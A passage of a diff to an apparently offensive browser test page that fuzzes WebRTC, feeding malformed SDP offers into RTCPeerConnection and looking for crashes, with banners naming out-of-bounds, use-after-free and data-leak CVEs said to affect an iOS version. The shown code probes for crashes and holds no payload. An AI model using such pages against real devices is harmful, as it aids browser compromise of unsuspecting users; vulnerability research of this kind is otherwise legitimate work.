-    {name:'NaN max-message-size',      mod:function(s){return s.replace('262144','NaN');}},
-    {name:'extra media sections ×100', mod:function(s){
-      var extra='m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\nc=IN IP4 0.0.0.0\r\na=mid:X\r\n';
-      return s+extra.repeat(100);
-    }},
-  ];
-
-  for(var ti=0;ti<sdpTests.length;ti++){
-    var t=sdpTests[ti];
-    try{
-      var pc6=new RTCPeerConnection({iceServers:[]});
-      var pc7=new RTCPeerConnection({iceServers:[]});
-      pc6.createDataChannel('x');
-
-      var offer3=await pc6.createOffer();
-      // Inject modified SDP
-      var modifiedSDP=t.mod(offer3.sdp);
-
-      try{
-        await pc6.setLocalDescription({type:'offer',sdp:modifiedSDP});
-        await pc7.setRemoteDescription({type:'offer',sdp:modifiedSDP});
-        ok('SDP['+t.name+']: setRemoteDescription accepted!');
-        // Try to get answer
-        var ans=await pc7.createAnswer();
-        await pc7.setLocalDescription(ans);
-        ok('  → answer created');
-      }catch(e){
-        info('SDP['+t.name+']: '+e.name+': '+e.message.slice(0,50));
-      }
-      pc6.close();pc7.close();
-    }catch(e){info('SDP['+t.name+']: outer '+e.name);}
-    await new Promise(function(r){setTimeout(r,100);});
-  }
-  ok('SDP fuzzing done. Check Analytics.');
+    ok('Stats checked: '+n+' numeric values');
+    ok('Types: '+[...new Set([...stats.values()].map(function(r){return r.type;}))].join(', '));
+    p1.close();p2.close();
+  }catch(e){info('Stats: '+e.name);}
+  ok('Stats done. Check Analytics if any crash.');
 }
 
 async function runAll(){
   clearLog();
-  w('=== WebRTC OOB + Canvas UAF + Data Leak ===\n','g');
-  w('[*] CVE-2026-64718 (WebRTC) + CVE-2026-43821 (Canvas) + CVE-2026-64778\n','d');
-  w('[*] All present in iOS 26.5.2, fixed in 26.6\n','d');
-  await runWebRTCOOB();
-  await runCanvasUAF();
-  await runDataLeak();
-  await runWebRTCSDP();
-  w('\nDone. Check Analytics.\n','g');
+  w('=== WebRTC OOB Fuzzer — CVE-2026-64718 ===\n','g');
+  w('[*] '+location.href+'\n','d');
+  if(!rtcOk){
+    w('[!!!] RTCPeerConnection NOT AVAILABLE\n','r');
+    w('This page must be served from a real HTTPS origin\n','r');
+    w('(not sandboxed iframe)\n','r');
+    return;
+  }
+  await runSDP();
+  await runCodec();
+  await runICE();
+  await runDC();
+  await runStats();
+  w('\nDone. Check Analytics for crashes.\n','g');
 }
 </script>
 </body></html>
-EOF
